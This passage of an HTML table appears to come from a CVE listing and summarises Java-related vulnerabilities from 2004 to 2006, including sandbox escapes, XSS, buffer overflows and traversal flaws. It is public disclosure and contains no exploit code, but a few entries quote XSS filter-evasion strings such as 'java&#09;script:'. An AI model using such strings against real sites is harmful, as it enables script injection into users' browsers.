		<td valign="top">Sun Java Runtime Environment (JRE) 1.5.0_6 and earlier, JDK 1.5.0_6 and earlier, and SDK 1.5.0_6 and earlier allows remote attackers to cause a denial of service (disk consumption) by using the Font.createFont function to create temporary files of arbitrary size in the %temp% directory.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-2199">CVE-2006-2199</a></td>
		<td valign="top">Unspecified vulnerability in Java Applets in OpenOffice.org 1.1.x (aka StarOffice) up to 1.1.5 and 2.0.x before 2.0.3 allows user-assisted attackers to escape the Java sandbox and conduct unauthorized activities via certain applets in OpenOffice documents.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-1981">CVE-2006-1981</a></td>
		<td valign="top">Unspecified vulnerability in Java InputMethods on Mac OS X 10.4.5 may cause InputMethods to send input events for secure fields to the wrong text field, which might reveal the password to others who can view the screen.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-1830">CVE-2006-1830</a></td>
		<td valign="top">Sun Java Studio Enterprise 8, when installed as root, creates certain files with world-writable permissions, which allows local users to execute arbitrary commands via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-1672">CVE-2006-1672</a></td>
		<td valign="top">The installation of Cisco Transport Controller (CTC) for Cisco Optical Networking System (ONS) 15000 series nodes adds a Java policy file entry with a wildcard that grants the java.security.AllPermission permission to any http URL containing "fs/LAUNCHER.jar", which allows remote attackers to execute arbitrary code on a CTC workstation, aka bug ID CSCea25049.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-0842">CVE-2006-0842</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in Calacode @Mail 4.3 allows remote attackers to inject arbitrary web script or HTML via a modified javascript: string in the SRC attribute of an IMG element in an e-mail message, as demonstrated by "java&amp;#09;script:."  NOTE: the provenance of this information is unknown; the details are obtained solely from third party information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-0663">CVE-2006-0663</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in Lotus Domino iNotes Client 6.5.4 and 7.0 allow remote attackers to inject arbitrary web script or HTML via (1) an email subject; (2) an encoded javascript URI, as demonstrated using "java&amp;#13;script:"; or (3) when the Domino Web Access ActiveX control is not installed, via an email attachment filename.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-0647">CVE-2006-0647</a></td>
		<td valign="top">LDAP service in Sun Java System Directory Server 5.2, running on Linux and possibly other platforms, allows remote attackers to cause a denial of service (memory allocation error) via an LDAP packet with a crafted subtree search request, as demonstrated using the ProtoVer LDAP test suite.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-0617">CVE-2006-0617</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in Sun Java JDK and JRE 5.0 Update 5 and earlier allow remote attackers to bypass Java sandbox security and obtain privileges via unspecified vectors involving the reflection APIs, aka the "fifth, sixth, and seventh issues."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-0616">CVE-2006-0616</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java JDK and JRE 5.0 Update 4 and earlier allows remote attackers to bypass Java sandbox security and obtain privileges via unspecified vectors involving the reflection APIs, aka the "fourth issue."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-0615">CVE-2006-0615</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in Sun Java JDK and JRE 5.0 Update 4 and earlier, SDK and JRE 1.4.x through 1.4.2_09 allow remote attackers to bypass Java sandbox security and obtain privileges via unspecified vectors involving the reflection APIs, aka the "second and third issues."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-0614">CVE-2006-0614</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java JDK and JRE 5.0 Update 3 and earlier, SDK and JRE 1.3.x through 1.3.1_16 and 1.4.x through 1.4.2_08 allows remote attackers to bypass Java sandbox security and obtain privileges via unspecified vectors involving the reflection APIs, aka the "first issue."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-0613">CVE-2006-0613</a></td>
		<td valign="top">Unspecified vulnerability in Java Web Start after 1.0.1_02, as used in J2SE 5.0 Update 5 and earlier, allows remote attackers to obtain privileges via unspecified vectors involving untrusted applications.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-0531">CVE-2006-0531</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java System Access Manager 7.0 allows local users logged in as "root" to bypass authentication and gain top-level administrator privileges via the amadmin CLI tool.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2006-0285">CVE-2006-0285</a></td>
		<td valign="top">Unspecified vulnerability in the Java Net component of Oracle Database Server 8.1.7.4, 9.0.1.5, 9.0.1.5 FIPS, 9.2.0.7, and 10.1.0.4, and Application Server 1.0.2.2, 9.0.4.2, and 10.1.2.0.2, has unspecified impact and attack vectors, as identified by Oracle Vuln# JN01.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-4845">CVE-2005-4845</a></td>
		<td valign="top">The Java Plug-in 1.4.2_03 and 1.4.2_04 controls, and the 1.4.2_03 and 1.4.2_04 &lt;applet&gt; redirector controls, allow remote attackers to cause a denial of service (Internet Explorer crash) by creating a COM object of the class associated with the control's CLSID, which is not intended for use within Internet Explorer.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-4806">CVE-2005-4806</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in Sun Java System Web Proxy Server 3.6 SP7 and earlier allow remote attackers to cause a denial of service (unresponsive service) via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-4805">CVE-2005-4805</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java System Application Server 7 Standard and Platform Edition 6 and earlier, and 2004Q2 Standard and Platform Edition Update 2 and earlier, allows remote attackers to obtain the source code for Java Server pages (JSP) via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-4804">CVE-2005-4804</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java System Application Server Platform Edition and Enterprise Edition 8.1 2005 Q1, and Platform Edition UR1, allows remote attackers to read .jar files via unknown vectors related to deployed web applications.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-4780">CVE-2005-4780</a></td>
		<td valign="top">** DISPUTED **

Cross-site scripting (XSS) vulnerability in Fidra Lighthouse CMS 1.1.0 and earlier allows remote attackers to inject arbitrary web script or HTML via the search parameter in a query_string to the home page. NOTE: The vendor disputes this issue, saying "Lighthouse does not in any way make use of the PHP technology.  [It] is an application server ... A technology like this cannot be susceptible to client-side cross-site-scripting-attacks on its own, but only applications created based on such a technology. This does not only apply to Lighthouse, but also to Perl, PHP or web applications based on Java Servlet technology."  Since the original researcher is known to test demo pages and is sometimes inaccurate, it is likely that this issue will be REJECTED.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-4761">CVE-2005-4761</a></td>
		<td valign="top">BEA WebLogic Server and WebLogic Express 8.1 SP4 and earlier, 7.0 SP5 and earlier, and 6.1 SP7 and earlier log the Java command line at server startup, which might include sensitive information (passwords or keyphrases) in the server log file when the -D option is used.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-4709">CVE-2005-4709</a></td>
		<td valign="top">The popSubjectContext method in the SecurityAssociation class in JBoss Enterprise Java Beans (EJB) 3.0 RC3 maintains the threadPrincipal and threadCredential values from a previous client's authentication after termination of a client session, which allows remote attackers to gain the roles of an arbitrary previous client who had the same JBoss server thread.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-4705">CVE-2005-4705</a></td>
		<td valign="top">BEA WebLogic Server and WebLogic Express 8.1 through SP4, 7.0 through SP6, and 6.1 through SP7, when a Java client application creates an SSL connection to the server after it has already created an insecure connection, will use the insecure connection, which allows remote attackers to sniff the connection.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-4344">CVE-2005-4344</a></td>
		<td valign="top">Adobe (formerly Macromedia) ColdFusion MX 7.0 does not honor when the CFOBJECT /CreateObject(Java) setting is disabled, which allows local users to create an object despite the specified configuration.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-4197">CVE-2005-4197</a></td>
		<td valign="top">tunnelform.yaws in Nortel SSL VPN 4.2.1.6 allows remote attackers to execute arbitrary commands via a link in the a parameter, which is executed with extra privileges in a cryptographically signed Java Applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-4046">CVE-2005-4046</a></td>
		<td valign="top">Unspecified vulnerability in Reverse SSL Proxy Plug-in for Sun Java System Application Server Standard Edition 7 2004Q2, Application Server Enterprise Edition 8.1 2005Q1, and Sun ONE Application Server 7 Standard Edition, as used in multiple web servers, allows remote attackers to conduct man-in-the-middle (MITM) attacks and "compromise data privacy."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-4045">CVE-2005-4045</a></td>
		<td valign="top">Unspecified vulnerability in System Communications Services 6 Delegated Administrator 2005Q1 in Sun Java System Messaging Server 2005Q1 allows remote attackers to obtain the Top-Level Administrator (TLA) default password via unknown vectors, possibly involving configure_toplevel_admin.ldif.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-3966">CVE-2005-3966</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in search.jsp in Java Search Engine (JSE) 0.9.34 allows remote attackers to inject arbitrary web script or HTML via the q parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-3946">CVE-2005-3946</a></td>
		<td valign="top">Opera 8.50 allows remote attackers to cause a denial of service (crash) via a Java applet with a large string argument to the removeMember JNI method for the com.opera.JSObject class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-3907">CVE-2005-3907</a></td>
		<td valign="top">Unspecified vulnerability in Java Runtime Environment in Java JDK and JRE 5.0 Update 3 and earlier allows remote attackers to escape the Java sandbox and access arbitrary files or execute arbitrary applications via unknown attack vectors involving untrusted Java applets.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-3906">CVE-2005-3906</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in reflection APIs in Java SDK and JRE 1.4.2_08 and earlier and JDK and JRE 5.0 Update 3 and earlier allow remote attackers to escape the Java sandbox and access arbitrary files or execute arbitrary applications via unknown attack vectors, a different set of vulnerabilities than CVE-2005-3905.  NOTE: this is associated with the "second and third issues" identified in SUNALERT:102003.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-3905">CVE-2005-3905</a></td>
		<td valign="top">Unspecified vulnerability in reflection APIs in Java SDK and JRE 1.3.1_15 and earlier, 1.4.2_08 and earlier, and JDK and JRE 5.0 Update 3 and earlier allows remote attackers to escape the Java sandbox and access arbitrary files or execute arbitrary application via unknown attack vectors, a different vulnerability than CVE-2005-3906.  NOTE: this is associated with the "first issue" identified in SUNALERT:102003.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-3904">CVE-2005-3904</a></td>
		<td valign="top">Unspecified vulnerability in Java Management Extensions (JMX) in Java JDK and JRE 5.0 Update 3, 1.4.2 and later, 1.3.1 and later allows remote attackers to escape the Java sandbox and access arbitrary files or execute arbitrary application via unknown attack vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-3757">CVE-2005-3757</a></td>
		<td valign="top">The Saxon XSLT parser in Google Mini Search Appliance, and possibly Google Search Appliance, allows remote attackers to obtain sensitive information and execute arbitrary code via dangerous Java class methods in select attribute of xsl:value-of tags in XSLT style sheets, such as (1) system-property, (2) sys:getProperty, and (3) run:exec.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-3583">CVE-2005-3583</a></td>
		<td valign="top">(1) Java Runtime Environment (JRE) and (2) Software Development Kit (SDK) 1.4.2_08, 1.4.2_09, and 1.5.0_05 and possibly other versions allow remote attackers to cause a denial of service (JVM unresponsive) via a crafted serialized object, such as a font object as demonstrated on JBoss.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-3472">CVE-2005-3472</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java System Communications Express 2005Q1 and 2004Q2 allows local and remote attackers to read sensitive information from configuration files.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-3269">CVE-2005-3269</a></td>
		<td valign="top">Stack-based buffer overflow in help.cgi in the HTTP administrative interface for (1) Sun Java System Directory Server 5.2 2003Q4, 2004Q2, and 2005Q1, (2) Red Hat Directory Server and (3) Certificate Server before 7.1 SP1, (4) Sun ONE Directory Server 5.1 SP4 and earlier, and (5) Sun ONE Administration Server 5.2 allows remote attackers to cause a denial of service (admin server crash), or local users to gain root privileges.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-3164">CVE-2005-3164</a></td>
		<td valign="top">The AJP connector in Apache Tomcat 4.0.1 through 4.0.6 and 4.1.0 through 4.1.36, as used in Hitachi Cosminexus Application Server and standalone, does not properly handle when a connection is broken before request body data is sent in a POST request, which can lead to an information leak when "unsuitable request body data" is used for a different request, possibly related to Java Servlet pages.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-2990">CVE-2005-2990</a></td>
		<td valign="top">AuthInfo.java in LineContol Java Client (jlc) before 0.8.1 stores sensitive information such as user passwords in log files.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-2759">CVE-2005-2759</a></td>
		<td valign="top">** SPLIT ** The jlucaller program in LiveUpdate for Symantec Norton AntiVirus 9.0.3 on Macintosh runs setuid when executing Java programs, which allows local users to gain privileges.  NOTE: due to a CNA error, this candidate was also originally assigned to an issue in DiskMountNotify.  Use CVE-2005-3270 for the DiskMountNotify issue, and CVE-2005-2759 for the LiveUpdate issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-2743">CVE-2005-2743</a></td>
		<td valign="top">The Java extensions for QuickTime 6.52 and earlier in Apple Mac OS X 10.3.9 allow untrusted applets to call arbitrary functions in system libraries, which allows remote attackers to execute arbitrary code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-2738">CVE-2005-2738</a></td>
		<td valign="top">Java 1.4.2 before 1.4.2 Release 2 on Apple Mac OS X does not prevent multiple programs from opening the same port as a Java ServerSocket, which allows local users to operate a Java program that intercepts network data intended for the ServerSocket of a different Java program.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-2715">CVE-2005-2715</a></td>
		<td valign="top">Format string vulnerability in the Java user interface service (bpjava-msvc) daemon for VERITAS NetBackup Data and Business Center 4.5FP and 4.5MP, and NetBackup Enterprise/Server/Client 5.0, 5.1, and 6.0, allows remote attackers to execute arbitrary code via the COMMAND_LOGON_TO_MSERVER command.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-2530">CVE-2005-2530</a></td>
		<td valign="top">Unspecified vulnerability in Java 1.3.1 before 1.3.1_16 on Apple Mac OS X allows an untrusted applet to gain privileges, related to "Mac OS X specific extensions."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-2529">CVE-2005-2529</a></td>
		<td valign="top">Unspecified vulnerability in Java 1.4.2 before 1.4.2 Release 2 on Apple Mac OS X allows local users to gain privileges via unspecified attack vectors relating to "the utility used to update Java shared archives."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-2527">CVE-2005-2527</a></td>
		<td valign="top">Race condition in Java 1.4.2 before 1.4.2 Release 2 on Apple Mac OS X allows local users to corrupt files or create arbitrary files via unspecified attack vectors related to a temporary directory, possibly due to a symlink attack.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-2343">CVE-2005-2343</a></td>
		<td valign="top">Research in Motion (RIM) BlackBerry Handheld web browser for BlackBerry Handheld before 4.0.2 allows remote attackers to cause a denial of service (hang) via a Java Application Description (JAD) file with a long application name and vendor string, which prevents a browser dialog from being properly dismissed.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-1974">CVE-2005-1974</a></td>
		<td valign="top">Unspecified vulnerability in Java 2 Platform, Standard Edition (J2SE) 5.0 and 5.0 Update 1 and J2SE 1.4.2 up to 1.4.2_07, as used in multiple products and platforms including (1) HP-UX and (2) APC PowerChute, allows applications to assign permissions to themselves and gain privileges.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-1973">CVE-2005-1973</a></td>
		<td valign="top">Java Web Start in Java 2 Platform Standard Edition (J2SE) 5.0 and 5.0 Update 1 allows applications to assign permissions to themselves and gain privileges.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-1682">CVE-2005-1682</a></td>
		<td valign="top">** DISPUTED **

JavaMail API, as used by Solstice Internet Mail Server POP3 2.0, does not properly validate the message number in the MimeMessage constructor in javax.mail.internet.InternetHeaders, which allows remote authenticated users to read other users' e-mail messages by modifying the msgno parameter.  NOTE: Sun disputes this issue, stating "The report makes references to source code and files that do not exist in the mentioned products."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-1232">CVE-2005-1232</a></td>
		<td valign="top">Buffer overflow in Sun Java System Web Proxy Server (aka Sun ONE Proxy Server) 3.6 SP6 allows remote attackers to execute arbitrary code via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-1150">CVE-2005-1150</a></td>
		<td valign="top">Unknown vulnerability in Sun Java System Web Server 6.0 SP7 and earlier, when running on Windows systems, allows attackers to cause a denial of service (hang).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-1112">CVE-2005-1112</a></td>
		<td valign="top">IBM WebSphere Application Server 6.0 and earlier, when sharing the document root of the web server, allows remote attackers to obtain the source code for Java Server Pages (.jsp) via an HTTP request with an invalid Host header, which causes the page to be processed by the web server instead of the JSP engine.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-1105">CVE-2005-1105</a></td>
		<td valign="top">Directory traversal vulnerability in the MimeBodyPart.getFileName method in JavaMail 1.3.2 allows remote attackers to write arbitrary files via a .. (dot dot) in the filename in the Content-Disposition header.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-1080">CVE-2005-1080</a></td>
		<td valign="top">Directory traversal vulnerability in the Java Archive Tool (Jar) utility in J2SE SDK 1.4.2 and 1.5, and OpenJDK, allows remote attackers to create or overwrite arbitrary files via a .. (dot dot) in filenames in a .jar file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-1022">CVE-2005-1022</a></td>
		<td valign="top">ColdFusion 6.1 Updater 1 places Java .class files under the web root in the /WEB-INF/cfclasses directory, which allows remote attackers to obtain sensitive information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-0836">CVE-2005-0836</a></td>
		<td valign="top">Argument injection vulnerability in Java Web Start for J2SE 1.4.2 up to 1.4.2_06 allows untrusted applications to gain privileges via the value parameter of a property tag in a JNLP file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-0742">CVE-2005-0742</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in Sun Java System Application Server 7 allows remote attackers to inject arbitrary web script or HTML via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-0538">CVE-2005-0538</a></td>
		<td valign="top">Directory traversal vulnerability in (1) GinpPictureServlet.java and (2) PicCollection.java in ginp (Java Photo Gallery Web Application) before 0.22 allows remote attackers to read arbitrary files.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-0471">CVE-2005-0471</a></td>
		<td valign="top">Sun Java JRE 1.1.x through 1.4.x writes temporary files with long filenames that become predictable on a file system that uses 8.3 style short names, which allows remote attackers to write arbitrary files to known locations and facilitates the exploitation of vulnerabilities in applications that rely on unpredictable file names.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-0441">CVE-2005-0441</a></td>
		<td valign="top">Multiple stack-based buffer overflows in Sybase Adaptive Server Enterprise (ASE) 12.x before 12.5.3 ESD#1 allow remote authenticated users to execute arbitrary code via the (1) attrib_valid function, (2) covert function, (3) declare statement, or (4) a crafted query plan, or remote authenticated users with database owner or "sa" role privileges to execute arbitrary code via (5) a crafted install java statement.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-0425">CVE-2005-0425</a></td>
		<td valign="top">Unknown vulnerability in IBM Websphere Application Server 5.0, 5.1, and 6.0 when running on Windows, allows remote attackers to obtain the source code for Java Server Pages (.jsp) via a crafted URL that causes the page to be processed by the file serving servlet instead of the JSP engine.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-0418">CVE-2005-0418</a></td>
		<td valign="top">Argument injection vulnerability in Java Web Start for J2SE 1.4.2 up to 1.4.2_06, on Mac OS X, allows untrusted applications to gain privileges via the value parameter of a property tag in a JNLP file. NOTE: it is highly likely that this item will be MERGED with CVE-2005-0836.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2005-0223">CVE-2005-0223</a></td>
		<td valign="top">The Software Development Kit (SDK) and Run Time Environment (RTE) 1.4.1 and 1.4.2 for Tru64 UNIX allows remote attackers to cause a denial of service (Java Virtual Machine hang) via object deserialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-2764">CVE-2004-2764</a></td>
		<td valign="top">Sun SDK and Java Runtime Environment (JRE) 1.4.2 through 1.4.2_04, 1.4.1 through 1.4.1_07, and 1.4.0 through 1.4.0_04 allows untrusted applets and unprivileged servlets to gain privileges and read data from other applets via unspecified vectors related to classes in the XSLT processor, aka "XML sniffing."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-2627">CVE-2004-2627</a></td>
		<td valign="top">Java 2 Micro Edition (J2ME) does not properly validate bytecode, which allows remote attackers to escape the Kilobyte Virtual Machine (KVM) sandbox and execute arbitrary code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-2626">CVE-2004-2626</a></td>
		<td valign="top">GUI overlay vulnerability in the Java API in Siemens S55 cellular phones allows remote attackers to send unauthorized SMS messages by overlaying a confirmation message with a malicious message.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-2540">CVE-2004-2540</a></td>
		<td valign="top">readObject in (1) Java Runtime Environment (JRE) and (2) Software Development Kit (SDK) 1.4.0 through 1.4.2_05 allows remote attackers to cause a denial of service (JVM unresponsive) via crafted serialized data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-2393">CVE-2004-2393</a></td>
		<td valign="top">Java Secure Socket Extension (JSSE) 1.0.3 through 1.0.3_2 does not properly validate the certificate chain of a client or server, which allows remote attackers to falsely authenticate peers for SSL/TLS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-2331">CVE-2004-2331</a></td>
		<td valign="top">ColdFusion MX 6.1 and 6.1 J2EE allows local users to bypass sandbox security restrictions and obtain sensitive information by using Java reflection methods to access trusted Java objects without using the CreateObject function or cfobject tag.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-2281">CVE-2004-2281</a></td>
		<td valign="top">Multiple unknown vulnerabilities in IBM Lotus Notes 6.5.x before 6.5.4 and 6.0.x before 6.0.5 have unknown impact and attack vectors, related to Java applets, as identified by (1) KSPR5YS6GR and (2) KSPR62F4D3.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-2280">CVE-2004-2280</a></td>
		<td valign="top">Buffer overflow in IBM Lotus Notes 6.5.x before 6.5.3 and 6.0.x before 6.0.5 allows remote attackers to cause a denial of service (crash) via unknown vectors related to Java applets, as identified by KSPR62F4KN.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-2216">CVE-2004-2216</a></td>
		<td valign="top">Unknown vulnerability in Sun Java System Web Server 6.0 SP7 and earlier and 6.1 SP1 and earlier, and Application Server 7 Update 4 and earlier, allows remote attackers to cause a denial of service (crash) via a malformed client certificate.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-1816">CVE-2004-1816</a></td>
		<td valign="top">Unknown vulnerability in Sun Java System Application Server 7.0 Update 2 and earlier, when a SOAP web service expects an array of objects as an argument, allows remote attackers to cause a denial of service (memory consumption).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-1753">CVE-2004-1753</a></td>
		<td valign="top">The Apple Java plugin, as used in Netscape 7.1 and 7.2, Mozilla 1.7.2, and Firefox 0.9.3 on MacOS X 10.3.5, when tabbed browsing is enabled, does not properly handle SetWindow(NULL) calls, which allows Java applets from one tab to draw to other tabs and facilitates phishing attacks that spoof tabs.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-1503">CVE-2004-1503</a></td>
		<td valign="top">Integer overflow in the InitialDirContext in Java Runtime Environment (JRE) 1.4.2, 1.5.0 and possibly other versions allows remote attackers to cause a denial of service (Java exception and failed DNS requests) via a large number of DNS requests, which causes the xid variable to wrap around and become negative.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-1489">CVE-2004-1489</a></td>
		<td valign="top">Opera 7.54 and earlier does not properly limit an applet's access to internal Java packages from Sun, which allows remote attackers to gain sensitive information, such as user names and the installation directory.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-1350">CVE-2004-1350</a></td>
		<td valign="top">Multiple buffer overflows in Sun Java System Web Proxy Server (formerly Sun ONE Proxy Server) 3.6 through 3.6 SP4 allow remote attackers to execute arbitrary code via unknown vectors, possibly CONNECT requests.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-1145">CVE-2004-1145</a></td>
